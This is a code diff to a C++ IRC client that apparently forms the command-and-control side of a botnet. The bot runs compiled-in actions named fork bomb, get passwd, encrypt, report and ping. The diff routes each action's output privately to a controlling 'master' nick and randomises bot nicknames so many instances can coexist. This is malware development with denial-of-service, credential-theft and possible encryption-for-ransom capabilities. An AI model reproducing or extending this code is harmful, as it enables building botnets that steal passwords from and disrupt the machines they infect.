@@ -17,8 +17,8 @@ std::vector<std::string> splitByNewline(const std::string& input) {
     return lines;
 }
 
-IrcClient::IrcClient(std::string server, int port, const char* exeName, std::string botNick, std::string botUser, std::string assignedChannel, std::string botPass)
-    : server(server.c_str()), port(port), exeName(exeName), botNick(botNick), botUser(botUser), assignedChannel(assignedChannel), botPass(botPass), session(nullptr) {
+IrcClient::IrcClient(std::string server, int port, const char* exeName, std::string botNick, std::string botUser, std::string assignedChannel, std::string botPass, std::string masterNick)
+    : server(server.c_str()), port(port), exeName(exeName), botNick(botNick), botUser(botUser), assignedChannel(assignedChannel), botPass(botPass), masterNick(masterNick), session(nullptr) {
     memset(&callbacks, 0, sizeof(callbacks));
     callbacks.event_connect = event_connect;
     callbacks.event_quit = dump_event;
@@ -28,6 +28,10 @@ IrcClient::IrcClient(std::string server, int port, const char* exeName, std::str
     callbacks.event_privmsg = dump_event;
     callbacks.event_unknown = event_unknown;
     registrationStatus = false;
+    // Ensure no duplicate nicks
+    size_t length = 8;
+    this->botNick += "_" + GeneralUtils::generateRandomAlphanumericString(length);
+    this->botUser += "_" + GeneralUtils::generateRandomAlphanumericString(length);
 
     session = irc_create_session(&callbacks);
     if (!session) {
@@ -75,7 +79,6 @@ std::string IrcClient::concatenateParams(const char* event, const char* origin, 
         result += " ";
     }
     
-    // Add each parameter
     for (unsigned int i = 0; i < count; ++i) {
         result += params[i];
         result += " ";
@@ -119,12 +122,10 @@ void IrcClient::event_connect(irc_session_t* session, const char* event, const c
 }
 
 void IrcClient::event_unknown(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
-    printf("event unknown hit\n");
     IrcClient::parseEvent(session, event, origin, params, count);
 }
 
 void IrcClient::dump_event(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
-	printf("dump event hit\n");
     IrcClient::parseEvent(session, event, origin, params, count);
 }
 void IrcClient::parseEvent(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
@@ -159,38 +160,32 @@ void IrcClient::parseEvent(irc_session_t* session, const char* event, const char
 
 void IrcClient::createAction(ActionInfo actionInfo) {
     Action* action = nullptr;
-    printf("Create action hit\n");
     #ifdef ENABLE_PING_ACTION
     if (actionInfo.getActionType() == ActionType::PING) { // check if bot was compiled to support this
-        printf("ping created\n");
         action = new PingAction(actionInfo.getActionParams());
     }
     #endif
 
     #ifdef ENABLE_ENCRYPT_ACTION
     if (actionInfo.getActionType() == ActionType::ENCRYPT) { // check if bot was compiled to support this
-        printf("ENCRYPT created\n");
         action = new EncryptAction(actionInfo.getActionParams());
     }
     #endif
 
     #ifdef ENABLE_REPORT_ACTION
     if (actionInfo.getActionType() == ActionType::REPORT) {
-        printf("REPORT created\n");
         action = new ReportAction(actionInfo.getActionParams());
     }
     #endif
 
     #ifdef ENABLE_FORK_BOMB_ACTION
     if (actionInfo.getActionType() == ActionType::FORK_BOMB) {
-        printf("fork bomb created\n");
         action = new ForkBombAction(actionInfo.getActionParams());
     }
     #endif
 
-     #ifdef ENABLE_GET_PASSWD_ACTION
+    #ifdef ENABLE_GET_PASSWD_ACTION
     if (actionInfo.getActionType() == ActionType::GET_PASSWD) {
-        printf("get passwd created\n");
         action = new GetPasswdAction(actionInfo.getActionParams());
     }
     #endif
@@ -200,7 +195,10 @@ void IrcClient::createAction(ActionInfo actionInfo) {
         if (action->getMessage() != "") {
             std::vector<std::string> lines = GeneralUtils::splitByNewLine(action->getMessage());
             for (const auto& line : lines) {
-                sendCommand(line);
+                if (!line.empty()) {
+                    std::string cmdToSend = "/PRIVMSG " + masterNick + " :" + line;
+                    sendCommand(cmdToSend);
+                }
             }
         }
         delete action;
